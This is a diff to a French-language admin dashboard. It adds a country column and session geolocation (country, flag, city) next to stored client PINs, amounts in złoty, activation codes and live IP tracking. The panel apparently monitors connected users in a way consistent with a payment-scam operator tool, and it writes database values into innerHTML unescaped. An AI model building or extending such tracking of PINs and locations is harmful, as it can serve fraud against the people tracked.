@@ -160,6 +160,7 @@
         .copy-field.editing input { background:#fff; }
         .client-name-link { color:var(--p); cursor:pointer; text-decoration:none; }
         .client-name-link:hover { text-decoration:underline; }
+        .badge-country { background:#EFF6FF; color:#1E40AF; padding:2px 10px; border-radius:12px; font-size:11px; font-weight:600; display:inline-flex; align-items:center; gap:4px; }
 
         @media (max-width: 480px) {
             table { font-size: 12px; }
@@ -385,6 +386,7 @@
                                 <th>PIN</th>
                                 <th>Montant</th>
                                 <th>Statut</th>
+                                <th>Pays</th>
                                 <th>Thème</th>
                                 <th>Code Act.</th>
                                 <th>%</th>
@@ -1044,6 +1046,7 @@
                                     <td><span class="badge">${v.pin}</span></td>
                                     <td>${Number(v.montant).toLocaleString('pl-PL')} ${v.devise || 'zł'}</td>
                                     <td id="status-${id}"><span class="text-muted">Chargement...</span></td>
+                                    <td id="country-${id}"><span class="text-muted">—</span></td>
                                     <td>${getThemeBadge(v.theme || 'purple')}</td>
                                     <td>${v.code}</td>
                                     <td>${v.pct}%</td>
@@ -1057,7 +1060,7 @@
                                 </tr>
                             `;
                         }).join('');
-                        $('tb').innerHTML = rows || '<tr><td colspan="8" style="text-align:center;color:#888;padding:24px;font-size:14px;">Aucun client enregistré</td></tr>';
+                        $('tb').innerHTML = rows || '<tr><td colspan="9" style="text-align:center;color:#888;padding:24px;font-size:14px;">Aucun client enregistré</td></tr>';
                         document.getElementById('clientCount').textContent = Object.keys(data).length;
                         refreshLists();
                         updateAllStatuses();
@@ -1067,9 +1070,14 @@
                         Object.keys(data).forEach(async (id) => {
                             const snap = await get(ref(db, 'clients/' + id + '/sessions'));
                             let active = 0;
+                            let countryHtml = '<span class="text-muted">—</span>';
                             if (snap.exists()) {
                                 const sessions = Object.values(snap.val());
                                 active = sessions.filter(s => s.connected === true).length;
+                                const activeSessions = sessions.filter(s => s.connected === true).sort((a,b) => (b.lastActivity||0) - (a.lastActivity||0));
+                                if (activeSessions.length > 0 && activeSessions[0].country) {
+                                    countryHtml = `<span class="badge-country">${activeSessions[0].countryFlag || '🌐'} ${activeSessions[0].country}</span>`;
+                                }
                             }
                             const statusCell = document.getElementById('status-' + id);
                             if (statusCell) {
@@ -1079,6 +1087,8 @@
                                     statusCell.innerHTML = `<span class="badge-offline"><i class="fas fa-circle"></i> Déconnecté</span>`;
                                 }
                             }
+                            const countryCell = document.getElementById('country-' + id);
+                            if (countryCell) countryCell.innerHTML = countryHtml;
                         });
                     }
 
@@ -1399,11 +1409,12 @@
                             const statusClass = s.connected ? 'online' : 'offline';
                             const statusText = s.connected ? 'Connecté' : 'Déconnecté';
                             const lastActivity = s.lastActivity ? new Date(s.lastActivity).toLocaleString() : 'Inconnu';
+                            const countryDisplay = s.country ? `<span style="font-size:11px;background:#EFF6FF;color:#1E40AF;padding:2px 8px;border-radius:10px;margin-left:6px;">${s.countryFlag || '🌐'} ${s.country}</span>` : '';
                             html += `
                                 <div class="session-item">
                                     <div>
-                                        <div class="device"><i class="fas fa-device"></i> ${s.device || 'Appareil inconnu'}</div>
-                                        <div class="ip"><i class="fas fa-map-pin"></i> ${s.ip || 'IP inconnue'}</div>
+                                        <div class="device"><i class="fas fa-device"></i> ${s.device || 'Appareil inconnu'}${countryDisplay}</div>
+                                        <div class="ip"><i class="fas fa-map-pin"></i> ${s.ip || 'IP inconnue'} ${s.city ? '(' + s.city + ')' : ''}</div>
                                         <div class="time"><i class="fas fa-clock"></i> Dernière activité : ${lastActivity}</div>
                                     </div>
                                     <div class="status ${statusClass}">${statusText}</div>
